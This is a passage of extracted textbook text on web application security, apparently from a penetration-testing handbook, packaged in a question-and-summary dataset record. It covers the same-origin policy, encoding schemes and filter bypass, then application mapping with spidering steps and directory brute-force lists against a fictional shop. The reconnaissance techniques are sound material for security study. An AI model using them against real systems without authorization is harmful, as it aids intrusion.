or capture credit card details when the user shops online. For\nthis reason, browsers implement restrictions to allow this type of interaction\nonly with content that has been received from the same origin.\nIn practice, applying this concept to the details of different web features and\ntechnologies leads to various complications and compromises. Here are some\nkey features of the same-origin policy that you need to be aware of:\nn A page residing on one domain can cause an arbitrary request to be made\nto another domain (for example, by submitting a form or loading an\nimage). But it cannot itself process the data returned from that request.\nn A page residing on one domain can load a script from another domain and\nexecute this within its own context. This is because scripts are assumed\nto contain code, rather than data, so cross-domain access should not lead\nto disclosure of any sensitive information.\nn A page residing on one domain cannot read or modify the cookies or\nother DOM data belonging to another domain.\nThese features can lead to various cross-domain attacks, such as inducing\nuser actions and capturing data. Further complications arise with browser\nextension technologies, which implement same-origin restrictions in different\nways. These issues are discussed in detail in Chapter 13.\n\nHTML5\nHTML5 is a major update to the HTML standard. HTML5 currently is still under\ndevelopment and is only partially implemented within browsers.\nFrom a security perspective, HTML5 is primarily of interest for the follow-\ning reasons:\nn It introduces various new tags, attributes, and APIs that can be lever-\naged to deliver cross-site scripting and other attacks, as described in\nChapter 12.\ncc0033..iinndddd 6644 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 65\nChapter 3 n Web Application Technologies 65\nn It modifi es the core Ajax technology, XMLHttpRequest, to enable two-way\ncross-domain interaction in certain situations. This can lead to new cross-\ndomain attacks, as described in Chapter 13.\nn It introduces new mechanisms for client-side data storage, which can lead\nto user privacy issues, and new categories of attack such as client-side SQL\ninjection, as described in Chapter 13.\n“Web 2.0”\nThis buzzword has become fashionable in recent years as a rather loose and\nnebulous name for a range of related trends in web applications, including the\nfollowing:\nn Heavy use of Ajax for performing asynchronous, behind-the-scenes requests\nn Increased cross-domain integration using various techniques\nn Use of new technologies on the client side, including XML, JSON, and Flex\nn More prominent functionality supporting user-generated content, infor-\nmation sharing, and interaction\nAs with all changes in technology, these trends present new opportunities\nfor security vulnerabilities to arise. However, they do not defi ne a clear subset\nof web application security issues in general. The vulnerabilities that occur in\nthese contexts are largely the same as, or closely derived from, types of vulner-\nabilities that preceded these trends. In general, talking about “Web 2.0 Security”\nusually represents a category mistake that does not facilitate clear thinking\nabout the issues that matter.\nBrowser Extension Technologies\nGoing beyond the capabilities of JavaScript, some web applications employ\nbrowser extension technologies that use custom code to extend the browser’s\nbuilt-in capabilities in arbitrary ways. These components may be deployed as\nbytecode that is executed by a suitable browser plug-in or may involve installing\nnative executables onto the client computer itself. The thick-client technologies\nyou are likely to encounter when attacking web applications are\nn Java applets\nn ActiveX controls\nn Flash objects\nn Silverlight objects\nThese technologies are described in detail in Chapter 5.\ncc0033..iinndddd 6655 88//1199//22001111 1122::0033::4455 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 66\n66 Chapter 3 n Web Application Technologies\nState and Sessions\nThe technologies described so far enable the server and client components of\na web application to exchange and process data in numerous ways. To imple-\nment most kinds of useful functionality, however, applications need to track the\nstate of each user’s interaction with the application across multiple requests. For\nexample, a shopping application may allow users to browse a product catalog,\nadd items to a cart, view and update the cart contents, proceed to checkout, and\nprovide personal and payment details.\nTo make this kind of functionality possible, the application must maintain a\nset of stateful data generated by the user’s actions across several requests. This\ndata normally is held within a server-side structure called a session. When a\nuser performs an action, such as adding an item to her shopping cart, the server-\nside application updates the relevant details within the user’s session. When the\nuser later views the contents of her cart, data from the session is used to return\nthe correct information to the user.\nIn some applications, state information is stored on the client component\nrather than the server. The current set of data is passed to the client in each\nserver response and is sent back to the server in each client request. Of course,\nbecause the user may modify any data transmitted via the client component,\napplications need to protect themselves from attackers who may change this\nstate information in an attempt to interfere with the application’s logic. The\nASP.NET platform makes use of a hidden form fi eld called ViewState to store\nstate information about the user’s web interface and thereby reduce overhead\non the server. By default, the contents of the ViewState include a keyed hash\nto prevent tampering.\nBecause the HTTP protocol is itself stateless, most applications need a way to\nreidentify individual users across multiple requests for the correct set of state\ndata to be used to process each request. Normally this is achieved by issuing\neach user a token that uniquely identifi es that user’s session. These tokens may\nbe transmitted using any type of request parameter, but most applications use\nHTTP cookies. Several kinds of vulnerabilities arise in relation to session han-\ndling, as described in detail in Chapter 7.\nEncoding Schemes\nWeb applications employ several different encoding schemes for their data. Both\nthe HTTP protocol and the HTML language are historically text-based, and dif-\nferent encoding schemes have been devised to ensure that these mechanisms\ncan safely handle unusual characters and binary data. When you are attacking\na web application, you will frequently need to encode data using a relevant\ncc0033..iinndddd 6666 88//1199//22001111 1122::0033::4466 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 67\nChapter 3 n Web Application Technologies 67\nscheme to ensure that it is handled in the way you intend. Furthermore, in many\ncases you may be able to manipulate the encoding schemes an application uses\nto cause behavior that its designers did not intend.\nURL Encoding\nURLs are permitted to contain only the printable characters in the US-ASCII\ncharacter set — that is, those whose ASCII code is in the range 0x20 to 0x7e,\ninclusive. Furthermore, several characters within this range are restricted because\nthey have special meaning within the URL scheme itself or within the HTTP\nprotocol.\nThe URL-encoding scheme is used to encode any problematic characters\nwithin the extended ASCII character set so that they can be safely transported\nover HTTP. The URL-encoded form of any character is the % prefi x followed by\nthe character’s two-digit ASCII code expressed in hexadecimal. Here are some\ncharacters that are commonly URL-encoded:\nn %3d — =\nn %25 — %\nn %20 — Space\nn %0a — New line\nn %00 — Null byte\nA further encoding to be aware of is the + character, which represents a\nURL-encoded space (in addition to the %20 representation of a space).\nNOTE For the purpose of attacking web applications, you should URL-\nencode any of the following characters when you insert them as data into an\nHTTP request:\nspace % ? & = ; + #\n(Of course, you will often need to use these characters with their special\nmeaning when modifying a request — for example, to add a request parameter\nto the query string. In this case, they should be used in their literal form.)\nUnicode Encoding\nUnicode is a character encoding standard that is designed to support all of the\nworld’s writing systems. It employs various encoding schemes, some of which\ncan be used to represent unusual characters in web applications.\n16-bit Unicode encoding works in a similar way to URL encoding. For\ntransmission over HTTP, the 16-bit Unicode-encoded form of a character is\ncc0033..iinndddd 6677 88//1199//22001111 1122::0033::4466 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 68\n68 Chapter 3 n Web Application Technologies\nthe %u prefi x followed by the character’s Unicode code point expressed in\nhexadecimal:\nn %u2215 — /\nn %u00e9 — é\nUTF-8 is a variable-length encoding standard that employs one or more bytes\nto express each character. For transmission over HTTP, the UTF-8-encoded form\nof a multibyte character simply uses each byte expressed in hexadecimal and\npreceded by the % prefi x:\nn %c2%a9 — ©\nn %e2%89%a0 — (cid:122)\nFor the purpose of attacking web applications, Unicode encoding is primarily\nof interest because it can sometimes be used to defeat input validation mecha-\nnisms. If an input fi lter blocks certain malicious expressions, but the component\nthat subsequently processes the input understands Unicode encoding, it may\nbe possible to bypass the fi lter using various standard and malformed Unicode\nencodings.\nHTML Encoding\nHTML encoding is used to represent problematic characters so that they can be\nsafely incorporated into an HTML document. Various characters have special\nmeaning as metacharacters within HTML and are used to defi ne a document’s\nstructure rather than its content. To use these characters safely as part of the\ndocument’s content, it is necessary to HTML-encode them.\nHTML encoding defi nes numerous HTML entities to represent specifi c literal\ncharacters:\nn &quot; — \"\nn &apos; — '\nn &amp; — &\nn &lt; — <\nn &gt; — >\nIn addition, any character can be HTML-encoded using its ASCII code in deci-\nmal form:\nn &#34; — \"\nn &#39; — '\nor by using its ASCII code in hexadecimal form (prefi xed by an x):\ncc0033..iinndddd 6688 88//1199//22001111 1122::0033::4466 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 69\nChapter 3 n Web Application Technologies 69\nn &#x22; — \"\nn &#x27; — '\nWhen you are attacking a web application, your main interest in HTML\nencoding is likely to be when probing for cross-site scripting vulnerabilities. If\nan application returns user input unmodifi ed within its responses, it is prob-\nably vulnerable, whereas if dangerous characters are HTML-encoded, it may\nbe safe. See Chapter 12 for more details on these vulnerabilities.\nBase64 Encoding\nBase64 encoding allows any binary data to be safely represented using only\nprintable ASCII characters. It is commonly used to encode e-mail attachments\nfor safe transmission over SMTP. It is also used to encode user credentials in\nbasic HTTP authentication.\nBase64 encoding processes input data in blocks of three bytes. Each of these\nblocks is divided into four chunks of six bits each. Six bits of data allows for 64\ndifferent possible permutations, so each chunk can be represented using a set\nof 64 characters. Base64 encoding employs the following character set, which\ncontains only printable ASCII characters:\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\nIf the fi nal block of input data results in fewer than three chunks of output\ndata, the output is padded with one or two = characters.\nFor example, here is the Base64-encoded form of TheWebApplicationHacker’s\nHandbook:\nVGhlIFdlYiBBcHBsaWNhdGlvbiBIYWNrZXIncyBIYW5kYm9vaw==\nMany web applications use Base64 encoding to transmit binary data within\ncookies and other parameters, and even to obfuscate (that is, to hide) sensitive\ndata to prevent trivial modifi cation. You should always look out for, and decode,\nany Base64 data that is issued to the client. Base64-encoded strings can often\nbe easily recognized by their specifi c character set and the presence of padding\ncharacters at the end of the string.\nHex Encoding\nMany applications use straightforward hexadecimal encoding when transmit-\nting binary data, using ASCII characters to represent the hexadecimal block.\nFor example, hex-encoding the username “daf” within a cookie would result\nin this:\n646166\ncc0033..iinndddd 6699 88//1199//22001111 1122::0033::4466 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 70\n70 Chapter 3 n Web Application Technologies\nAs with Base64, hex-encoded data is usually easy to spot. You should always\nattempt to decode any such data that the server sends to the client to understand\nits function.\nRemoting and Serialization Frameworks\nIn recent years, various frameworks have evolved for creating user interfaces in\nwhich client-side code can remotely access various programmatic APIs imple-\nmented on the server side. This allows developers to partly abstract away from\nthe distributed nature of web applications and write code in a manner that is\ncloser to the paradigm of a conventional desktop application. These frameworks\ntypically provide stub APIs for use on the client side. They also automatically\nhandle both the remoting of these API calls to the relevant server-side functions\nand the serialization of any data that is passed to those functions.\nExamples of these kinds of remoting and serialization frameworks include\nthe following:\nn Flex and AMF\nn Silverlight and WCF\nn Java serialized objects\nWe will discuss techniques for working with these frameworks, and the kinds\nof security issues that can arise, in Chapters 4 and 5.\nNext Steps\nSo far, we have described the current state of web application (in)security, exam-\nined the core mechanisms by which web applications can defend themselves,\nand taken a brief look at the key technologies employed in today’s applications.\nWith this groundwork in place, we are now in a position to start looking at the\nactual practicalities of attacking web applications.\nIn any attack, your fi rst task is to map the target application’s content and\nfunctionality to establish how it functions, how it attempts to defend itself, and\nwhat technologies it uses. The next chapter examines this mapping process\nin detail and shows how you can use it to obtain a deep understanding of an\napplication’s attack surface. This knowledge will prove vital when it comes to\nfi nding and exploiting security fl aws within your target.\ncc0033..iinndddd 7700 88//1199//22001111 1122::0033::4466 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 71\nChapter 3 n Web Application Technologies 71\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. What is the OPTIONS method used for?\n2. What are the If-Modified-Since and If-None-Match headers used for?\nWhy might you be interested in these when attacking an application?\n3. What is the signifi cance of the secure fl ag when a server sets a cookie?\n4. What is the difference between the common status codes 301 and 302?\n5. How does a browser interoperate with a web proxy when SSL is being\nused?\ncc0033..iinndddd 7711 88//1199//22001111 1122::0033::4466 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 72\ncc0033..iinndddd 7722 88//1199//22001111 1122::0033::4466 PPMM",
    "question": "What is the role of HTTP proxies in web application security and how do they handle requests and responses when SSL is involved?",
    "summary": "HTTPS is a secure version of HTTP that uses SSL/TLS to encrypt data, protecting it from interception. HTTP proxies act as intermediaries that can relay requests and responses, and can be used to intercept and modify traffic, including HTTPS, by using the CONNECT method. Web applications use various technologies like HTML, CSS, JavaScript, and server-side scripts to deliver functionality, and understanding these is essential for identifying and exploiting security vulnerabilities."
  },
  {
    "start": 67,
    "end": 90,
    "text": "Stuttard c04.indd V3 - 07/22/2011 Page 73\n\nCHAPTER\n4\nMapping the Application\nThe fi rst step in the process of attacking an application is gathering and examin-\ning some key information about it to gain a better understanding of what you\nare up against.\nThe mapping exercise begins by enumerating the application’s content and\nfunctionality in order to understand what the application does and how it\nbehaves. Much of this functionality is easy to identify, but some of it may be\nhidden, requiring a degree of guesswork and luck to discover.\nAfter a catalog of the application’s functionality has been assembled, the\nprincipal task is to closely examine every aspect of its behavior, its core secu-\nrity mechanisms, and the technologies being employed (on both the client and\nserver). This will enable you to identify the key attack surface that the application\nexposes and hence the most interesting areas where you should target subse-\nquent probing to fi nd exploitable vulnerabilities. Often the analysis exercise can\nuncover vulnerabilities by itself, as discussed later in the chapter.\nAs applications get ever larger and more functional, effective mapping is a\nvaluable skill. A seasoned expert can quickly triage whole areas of functionality,\nlooking for classes of vulnerabilities as opposed to instances, while investing\nsignifi cant time in testing other specifi c areas, aiming to uncover a high-risk issue.\nThis chapter describes the practical steps you need to follow during application\nmapping, various techniques and tricks you can use to maximize its effective-\nness, and some tools that can assist you in the process.\n73\ncc0044..iinndddd 7733 88//1199//22001111 1122::0044::4400 PPMM\n\nStuttard c04.indd V3 - 07/22/2011 Page 74\n74 Chapter 4 n Mapping the Application\nEnumerating Content and Functionality\nIn a typical application, the majority of the content and functionality can be\nidentifi ed via manual browsing. The basic approach is to walk through the\napplication starting from the main initial page, following every link, and navi-\ngating through all multistage functions (such as user registration or password\nresetting). If the application contains a “site map,” this can provide a useful\nstarting point for enumerating content.\nHowever, to perform a rigorous inspection of the enumerated content, and\nto obtain a comprehensive record of everything identifi ed, you must employ\nmore advanced techniques than simple browsing.\nWeb Spidering\nVarious tools can perform automated spidering of websites. These tools work\nby requesting a web page, parsing it for links to other content, requesting these\nlinks, and continuing recursively until no new content is discovered.\nBuilding on this basic function, web application spiders attempt to achieve\na higher level of coverage by also parsing HTML forms and submitting these\nback to the application using various preset or random values. This can enable\nthem to walk through multistage functionality and to follow forms-based navi-\ngation (such as where drop-down lists are used as content menus). Some tools\nalso parse client-side JavaScript to extract URLs pointing to further content.\nNumerous free tools are available that do a decent job of enumerating applica-\ntion content and functionality, including Burp Suite, WebScarab, Zed Attack\nProxy, and CAT (see Chapter 20 for more details).\nTIP Many web servers contain a fi le named robots.txt in the web root that\ncontains a list of URLs that the site does not want web spiders to visit or search\nengines to index. Sometimes, this fi le contains references to sensitive func-\ntionality, which you are certainly interested in spidering. Some spidering tools\ndesigned for attacking web applications check for the robots.txt fi le and use\nall URLs within it as seeds in the spidering process. In this case, the robots.txt\nfi le may be counterproductive to the security of the web application.\nThis chapter uses a fi ctional application, Extreme Internet Shopping (EIS), to\nprovide examples of common application mapping actions. Figure 4-1 shows\nBurp Spider running against EIS. Without logging on, it is possible to map out the\n/shop directory and two news articles in the /media directory. Also note that\nthe robots.txt fi le shown in the fi gure references the directories /mdsecportal\nand /site-old. These are not linked from anywhere in the application and would\nnot be indexed by a web spider that only followed links from published content.\nTIP Applications that employ REST-style URLs use portions of the URL fi le\npath to uniquely identify data and other resources used within the application\ncc0044..iinndddd 7744 88//1199//22001111 1122::0044::4411 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 75\nChapter 4 n Mapping the Application 75\n(see Chapter 3 for more details). The traditional web spider’s URL-based view\nof the application is useful in these situations. In the EIS application, the\n/shop and /pub paths employ REST-style URLs, and spidering these areas eas-\nily provides unique links to the items available within these paths.\nFigure 4-1: Mapping part of an application using Burp Spider\nAlthough it can often be effective, this kind of fully automated approach to\ncontent enumeration has some signifi cant limitations:\nn Unusual navigation mechanisms (such as menus dynamically created\nand handled using complicated JavaScript code) often are not handled\nproperly by these tools, so they may miss whole areas of an application.\nn Links buried within compiled client-side objects such as Flash or Java\napplets may not be picked up by a spider.\nn Multistage functionality often implements fi ne-grained input validation\nchecks, which do not accept the values that may be submitted by an auto-\nmated tool. For example, a user registration form may contain fi elds for\nname, e-mail address, telephone number, and zip code. An automated\ncc0044..iinndddd 7755 88//1199//22001111 1122::0044::4411 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 76\n76 Chapter 4 n Mapping the Application\napplication spider typically submits a single test string in each editable\nform fi eld, and the application returns an error message saying that one\nor more of the items submitted were invalid. Because the spider is not\nintelligent enough to understand and act on this message, it does not\nproceed past the registration form and therefore does not discover any\nmore content or functions accessible beyond it.\nn Automated spiders typically use URLs as identifi ers of unique content.\nTo avoid continuing spidering indefi nitely, they recognize when linked\ncontent has already been requested and do not request it again. However,\nmany applications use forms-based navigation in which the same URL\nmay return very different content and functions. For example, a bank-\ning application may implement every user action via a POST request to\n/account.jsp and use parameters to communicate the action being per-\nformed. If a spider refuses to make multiple requests to this URL, it will\nmiss most of the application’s content. Some application spiders attempt\nto handle this situation. For example, Burp Spider can be confi gured to\nindividuate form submissions based on parameter names and values.\nHowever, there may still be situations where a fully automated approach\nis not completely effective. We discuss approaches to mapping this kind\nof functionality later in this chapter.\nn Conversely to the previous point, some applications place volatile data\nwithin URLs that is not actually used to identify resources or functions (for\nexample, parameters containing timers or random number seeds). Each\npage of the application may contain what appears to be a new set of URLs\nthat the spider must request, causing it to continue running indefi nitely.\nn Where an application uses authentication, an effective application spider\nmust be able to handle this to access the functionality that the authen-\ntication protects. The spiders mentioned previously can achieve this by\nmanually confi guring the spider either with a token for an authenticated\nsession or with credentials to submit to the login function. However, even\nwhen this is done, it is common to fi nd that the spider’s operation breaks\nthe authenticated session for various reasons:\nn By following all URLs, at some point the spider will request the logout\nfunction, causing its session to break.\nn If the spider submits invalid input to a sensitive function, the applica-\ntion may defensively terminate the session.\nn If the application uses per-page tokens, the spider almost certainly will\nfail to handle these properly by requesting pages out of their expected\nsequence, probably causing the entire session to be terminated.\ncc0044..iinndddd 7766 88//1199//22001111 1122::0044::4411 PPMM\n\nStuttard c04.indd V3 - 07/22/2011 Page 77\nChapter 4 n Mapping the Application 77\nWARNING In some applications, running even a simple web spider that\nparses and requests links can be extremely dangerous. For example, an applica-\ntion may contain administrative functionality that deletes users, shuts down a\ndatabase, restarts the server, and the like. If an application-aware spider is used,\ngreat damage can be done if the spider discovers and uses sensitive functional-\nity. The authors have encountered an application that included some Content\nManagement System (CMS) functionality for editing the content of the main\napplication. This functionality could be discovered via the site map and was not\nprotected by any access control. If an automated spider were run against this\nsite, it would fi nd the edit function and begin sending arbitrary data, resulting in\nthe main website’s being defaced in real time while the spider was running.\nUser-Directed Spidering\nThis is a more sophisticated and controlled technique that is usually prefer-\nable to automated spidering. Here, the user walks through the application in\nthe normal way using a standard browser, attempting to navigate through all\nthe application’s functionality. As he does so, the resulting traffi c is passed\nthrough a tool combining an intercepting proxy and spider, which monitors\nall requests and responses. The tool builds a map of the application, incorpo-\nrating all the URLs visited by the browser. It also parses all the application’s\nresponses in the same way as a normal application-aware spider and updates\nthe site map with the content and functionality it discovers. The spiders\nwithin Burp Suite and WebScarab can be used in this way (see Chapter 20\nfor more information).\nCompared with the basic spidering approach, this technique offers numer-\nous benefi ts:\nn Where the application uses unusual or complex mechanisms for navigation,\nthe user can follow these using a browser in the normal way. Any functions\nand content accessed by the user are processed by the proxy/spider tool.\nn The user controls all data submitted to the application and can ensure\nthat data validation requirements are met.\nn The user can log in to the application in the usual way and ensure that the\nauthenticated session remains active throughout the mapping process. If\nany action performed results in session termination, the user can log in\nagain and continue browsing.\nn Any dangerous functionality, such as deleteUser.jsp, is fully enumer-\nated and incorporated into the proxy’s site map, because links to it will be\nparsed out of the application’s responses. But the user can use discretion\nin deciding which functions to actually request or carry out.\ncc0044..iinndddd 7777 88//1199//22001111 1122::0044::4411 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 78\n78 Chapter 4 n Mapping the Application\nIn the Extreme Internet Shopping site, previously it was impossible for the\nspider to index any content within /home, because this content is authenticated.\nRequests to /home result in this response:\nHTTP/1.1 302 Moved Temporarily\nDate: Mon, 24 Jan 2011 16:13:12 GMT\nServer: Apache\nLocation: /auth/Login?ReturnURL=/home/\nWith user-directed spidering, the user can simply log in to the application\nusing her browser, and the proxy/spider tool picks up the resulting session and\nidentifi es all the additional content now available to the user. Figure 4-2 shows\nthe EIS site map when the user has successfully authenticated to the protected\nareas of the application.\nFigure 4-2: Burp’s site map after user-guided spidering has been performed\nThis reveals some additional resources within the home menu system. The\nfi gure shows a reference to a private profi le that is accessed through a JavaScript\nfunction launched with the onClick event handler:\n<a href=”#” onclick=”ui_nav(‘profile’)”>private profile</a>\ncc0044..iinndddd 7788 88//1199//22001111 1122::0044::4411 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 79\nChapter 4 n Mapping the Application 79\nA conventional web spider that simply follows links within HTML is likely to\nmiss this type of link. Even the most advanced automated application crawlers\nlag way behind the numerous navigational mechanisms employed by today’s\napplications and browser extensions. With user-directed spidering, however,\nthe user simply needs to follow the visible on-screen link using her browser,\nand the proxy/spider tool adds the resulting content to the site map.\nConversely, note that the spider has successfully identifi ed the link to /core/\nsitestats contained in an HTML comment, even though this link is not shown\non-screen to the user.\nTIP In addition to the proxy/spider tools just described, another range\nof tools that are often useful during application mapping are the various\nbrowser extensions that can perform HTTP and HTML analysis from within the\nbrowser interface. For example, the IEWatch tool shown in Figure 4-3, which\nruns within Microsoft Internet Explorer, monitors all details of requests and\nresponses, including headers, request parameters, and cookies. It analyzes\nevery application page to display links, scripts, forms, and thick-client compo-\nnents. Of course, all this information can be viewed in your intercepting proxy,\nbut having a second record of useful mapping data can only help you better\nunderstand the application and enumerate all its functionality. See Chapter 20\nfor more information about tools of this kind.\nFigure 4-3: IEWatch performing HTTP and HTML analysis from within the browser\ncc0044..iinndddd 7799 88//1199//22001111 1122::0044::4422 PPMM\n\nStuttard c04.indd V3 - 07/22/2011 Page 80\n80 Chapter 4 n Mapping the Application\n\nHACK STEPS\n1. Configure your browser to use either Burp or WebScarab as a local proxy\n(see Chapter 20 for specific details about how to do this if you’re unsure).\n2. Browse the entire application normally, attempting to visit every link/URL\nyou discover, submitting every form, and proceeding through all multi-\nstep functions to completion. Try browsing with JavaScript enabled and\ndisabled, and with cookies enabled and disabled. Many applications can\nhandle various browser configurations, and you may reach different con-\ntent and code paths within the application.\n3. Review the site map generated by the proxy/spider tool, and identify\nany application content or functions that you did not browse manually.\nEstablish how the spider enumerated each item. For example, in Burp\nSpider, check the Linked From details. Using your browser, access the item\nmanually so that the response from the server is parsed by the proxy/spi-\nder tool to identify any further content. Continue this step recursively until\nno further content or functionality is identified.\n4. Optionally, tell the tool to actively spider the site using all of the already\nenumerated content as a starting point. To do this, first identify any URLs\nthat are dangerous or likely to break the application session, and config-\nure the spider to exclude these from its scope. Run the spider and review\nthe results for any additional content it discovers.\nThe site map generated by the proxy/spider tool contains a wealth of infor-\nmation about the target application, which will be useful later in identifying\nthe various attack surfaces exposed by the application.\nDiscovering Hidden Content\nIt is common for applications to contain content and functionality that is not\ndirectly linked to or reachable from the main visible content. A common example\nis functionality that has been implemented for testing or debugging purposes\nand has never been removed.\nAnother example arises when the application presents different functionality\nto different categories of users (for example, anonymous users, authenticated\nregular users, and administrators). Users at one privilege level who perform\nexhaustive spidering of the application may miss functionality that is visible to\nusers at other levels. An attacker who discovers the functionality may be able\nto exploit it to elevate her privileges within the application.\nThere are countless other cases in which interesting content and functionality\nmay exist that the mapping techniques previously described would not identify:\nn Backup copies of live fi les. In the case of dynamic pages, their fi le extension\nmay have changed to one that is not mapped as executable, enabling you\ncc0044..iinndddd 8800 88//1199//22001111 1122::0044::4422 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 81\nChapter 4 n Mapping the Application 81\nto review the page source for vulnerabilities that can then be exploited\non the live page.\nn Backup archives that contain a full snapshot of fi les within (or indeed\noutside) the web root, possibly enabling you to easily identify all content\nand functionality within the application.\nn New functionality that has been deployed to the server for testing but not\nyet linked from the main application.\nn Default application functionality in an off-the-shelf application that has\nbeen superfi cially hidden from the user but is still present on the server.\nn Old versions of fi les that have not been removed from the server. In the\ncase of dynamic pages, these may contain vulnerabilities that have been\nfi xed in the current version but that can still be exploited in the old version.\nn Confi guration and include fi les containing sensitive data such as database\ncredentials.\nn Source fi les from which the live application’s functionality has been\ncompiled.\nn Comments in source code that in extreme cases may contain information\nsuch as usernames and passwords but that more likely provide information\nabout the state of the application. Key phrases such as “test this function”\nor something similar are strong indicators of where to start hunting for\nvulnerabilities.\nn Log fi les that may contain sensitive information such as valid usernames,\nsession tokens, URLs visited, and actions performed.\nEffective discovery of hidden content requires a combination of automated and\nmanual techniques and often relies on a degree of luck.\nBrute-Force Techniques\nChapter 14 describes how automated techniques can be leveraged to speed up\njust about any attack against an application. In the present context of informa-\ntion gathering, automation can be used to make huge numbers of requests to the\nweb server, attempting to guess the names or identifi ers of hidden functionality.\nFor example, suppose that your user-directed spidering has identifi ed the\nfollowing application content:\nhttp://eis/auth/Login\nhttp://eis/auth/ForgotPassword\nhttp://eis/home/\nhttp://eis/pub/media/100/view\nhttp://eis/images/eis.gif\nhttp://eis/include/eis.css\ncc0044..iinndddd 8811 88//1199//22001111 1122::0044::4422 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 82\n82 Chapter 4 n Mapping the Application\nThe fi rst step in an automated effort to identify hidden content might involve\nthe following requests, to locate additional directories:\nhttp://eis/About/\nhttp://eis/abstract/\nhttp://eis/academics/\nhttp://eis/accessibility/\nhttp://eis/accounts/\nhttp://eis/action/\n...\nBurp Intruder can be used to iterate through a list of common directory\nnames and capture details of the server’s responses, which can be reviewed to\nidentify valid directories. Figure 4-4 shows Burp Intruder being confi gured to\nprobe for common directories residing at the web root.\nFigure 4-4: Burp Intruder being configured to probe for common directories\nWhen the attack has been executed, clicking column headers such as “status”\nand “length” sorts the results accordingly, enabling you to quickly identify a\nlist of potential further resources, as shown in Figure 4-5.\nHaving brute-forced for directories and subdirectories, you may then want\nto fi nd additional pages in the application. Of particular interest is the /auth\ndirectory containing the Login resource identifi ed during the spidering pro-\ncess, which is likely to be a good starting point for an unauthenticated attacker.\nAgain, you can request a series of fi les within this directory:\ncc0044..iinndddd 8822 88//1199//22001111 1122::0044::4422 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 83\nChapter 4 n Mapping the Application 83\nhttp://eis/auth/About/\nhttp://eis/auth/Aboutus/\nhttp://eis/auth/AddUser/\nhttp://eis/auth/Admin/\nhttp://eis/auth/Administration/\nhttp://eis/auth/Admins/\n...\nFigure 4-5: Burp Intruder showing the results of a directory brute-force attack\nFigure 4-6 shows the results of this attack, which has identifi ed several resources\nwithin the /auth directory:\nLogin\nLogout\nRegister\nProfile\nNote that the request for Profile returns the HTTP status code 302. This\nindicates that accessing this link without authentication redirects the user to\nthe login page. Of further interest is that although the Login page was discov-\nered during spidering, the Register page was not. It could be that this extra\nfunctionality is operational, and an attacker could register a user account on\nthe site.\ncc0044..iinndddd 8833 88//1199//22001111 1122::0044::4422 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 84\n84 Chapter 4 n Mapping the Application\nFigure 4-6: Burp Intruder showing the results of a file brute-force attack\nNOTE Do not assume that the application will respond with 200 OK if a\nrequested resource exists and 404 Not Found if it does not. Many applica-\ntions handle requests for nonexistent resources in a customized way, often\nreturning a bespoke error message and a 200 response code. Furthermore,\nsome requests for existent resources may receive a non-200 response. The fol-\nlowing is a rough guide to the likely meaning of the response codes that you\nmay encounter during a brute-force exercise looking for hidden content:\nn 302 Found — If the redirect is to a login page, the resource may be\naccessible only by authenticated users. If the redirect is to an error mes-\nsage, this may indicate a different reason. If it is to another location, the\nredirect may be part of the application’s intended logic, and this should\nbe investigated further.\nn 400 Bad Request — The application may use a custom naming scheme\nfor directories and fi les within URLs, which a particular request has not\ncomplied with. More likely, however, is that the wordlist you are using\ncontains some whitespace characters or other invalid syntax.\nn 401 Unauthorized or 403 Forbidden — This usually indicates that\nthe requested resource exists but may not be accessed by any user,\ncc0044..iinndddd 8844 88//1199//22001111 1122::0044::4433 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 85\nChapter 4 n Mapping the Application 85\nregardless of authentication status or privilege level. It often occurs when\ndirectories are requested, and you may infer that the directory exists.\nn 500 Internal Server Error — During content discovery, this usually\nindicates that the application expects certain parameters to be submitted\nwhen requesting the resource.\nThe various possible responses that may indicate the presence of interesting\ncontent mean that is diffi cult to write a fully automated script to output a list-\ning of valid resources. The best approach is to capture as much information as\npossible about the application’s responses during the brute-force exercise and\nmanually review it.\n\nHACK STEPS\n1. Make some manual requests for known valid and invalid resources, and\nidentify how the server handles the latter.\n2. Use the site map generated through user-directed spidering as a basis for\nautomated discovery of hidden content.\n3. Make automated requests for common filenames and directories within\neach directory or path known to exist within the application. Use Burp\nIntruder or a custom script, together with wordlists of common files and\ndirectories, to quickly generate large numbers of requests. If you have iden-\ntified a particular way in which the application handles requests for invalid\nresources (such as a customized “file not found” page), configure Intruder\nor your script to highlight these results so that they can be ignored.\n4. Capture the responses received from the server, and manually review\nthem to identify valid resources.\n5. Perform the exercise recursively as new content is discovered.\nInference from Published Content\nMost applications employ some kind of naming scheme for their content and\nfunctionality. By inferring from the resources already identifi ed within the\napplication, it is possible to fi ne-tune your automated enumeration exercise to\nincrease the likelihood of discovering further hidden content.\nIn the EIS application, note that all resources in /auth start with a capital letter.\nThis is why the wordlist used in the fi le brute forcing in the previous section\nwas deliberately capitalized. Furthermore, since we have already identifi ed a\npage called ForgotPassword in the /auth directory, we can search for similarly\nnamed items, such as the following:\nhttp://eis/auth/ResetPassword\ncc0044..iinndddd 8855 88//1199//22001111 1122::0044::4433 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 86\n86 Chapter 4 n Mapping the Application\nAdditionally, the site map created during user-directed spidering identifi ed\nthese resources:\nhttp://eis/pub/media/100\nhttp://eis/pub/media/117\nhttp://eis/pub/user/11\nOther numeric values in a similar range are likely to identify further resources\nand information.\nTIP Burp Intruder is highly customizable and can be used to target any por-\ntion of an HTTP request. Figure 4-7 shows Burp Intruder being used to per-\nform a brute-force attack on the fi rst half of a fi lename to make the 